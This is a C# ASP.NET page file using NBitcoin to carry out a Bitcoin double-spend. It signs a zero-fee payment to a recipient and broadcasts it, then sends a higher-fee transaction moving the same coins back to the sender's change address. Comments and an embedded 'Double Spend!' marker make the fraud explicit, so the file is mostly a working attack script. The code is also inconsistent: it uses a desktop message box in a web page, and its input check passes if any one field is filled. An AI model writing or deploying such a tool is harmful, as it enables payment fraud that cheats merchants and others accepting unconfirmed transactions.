using System;
using NBitcoin;
using System.Windows.Forms;
using System.Text;
using System.Threading;
using NBitcoin.Protocol;

public partial class _Default : System.Web.UI.Page
{
    public void doubleSpend (string address, string change, Decimal fee)
    {
        var blockr = new BlockrTransactionRepository();
        Transaction fundingTransaction = blockr.Get(txTextBox.Text);

        Transaction payment = new Transaction();
        payment.Inputs.Add(new TxIn()
        {
            PrevOut = new OutPoint(fundingTransaction.GetHash(), 1)
        });

        BitcoinSecret s = new BitcoinSecret(privateKeyTextBox.Text, Network.Main);

        var destination = BitcoinAddress.Create(address);
        var changeAddress = BitcoinAddress.Create(change);

        payment.Outputs.Add(new TxOut()
        {
            Value = Money.Coins(Decimal.Parse(amountTextBox.Text)),
            ScriptPubKey = destination.ScriptPubKey //goes to destination address
        });
        payment.Outputs.Add(new TxOut()
        {
            Value = Money.Coins(Decimal.Parse(remainderTextBox.Text) - fee),
            //fee is subtracted from change amount and goes to the miners as the difference
            ScriptPubKey = changeAddress.ScriptPubKey //goes back as change
        });

        var message = "Double Spend!";
        var bytes = Encoding.UTF8.GetBytes(message);
        payment.Outputs.Add(new TxOut()
        {
            Value = Money.Zero,
            ScriptPubKey = TxNullDataTemplate.Instance.GenerateScriptPubKey(bytes)
        });
        Console.WriteLine(payment);

        payment.Inputs[0].ScriptSig = fundingTransaction.Outputs[1].ScriptPubKey;
        payment.Sign(s, false);

        
        using (var node = Node.ConnectToLocal(Network.Main)) //Connect to the node
        {
            node.VersionHandshake(); //Say hello
            //Advertize your transaction (send just the hash)
            node.SendMessage(new InvPayload(InventoryType.MSG_TX, payment.GetHash()));
            //Send it
            node.SendMessage(new TxPayload(payment));
            Thread.Sleep(500); //Wait a bit
        }

    }

    protected void sendButton_Click(object sender, EventArgs e)
    {
        if (txTextBox.Text != "" || destinationTextBox.Text != "" || privateKeyTextBox.Text != "" || remainderTextBox.Text != "" || amountTextBox.Text != "" || changeTextBox.Text != "")
        {
            doubleSpend(destinationTextBox.Text,changeTextBox.Text, 0m); //pays no fee so it is low priority
            doubleSpend(changeTextBox.Text, changeTextBox.Text, 0.001m); //pays higher fee, gets higher priority and causes double spend
        }
        else
        {
            MessageBox.Show("Please try again", "Invalid or incomplete info provided", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
    }
}
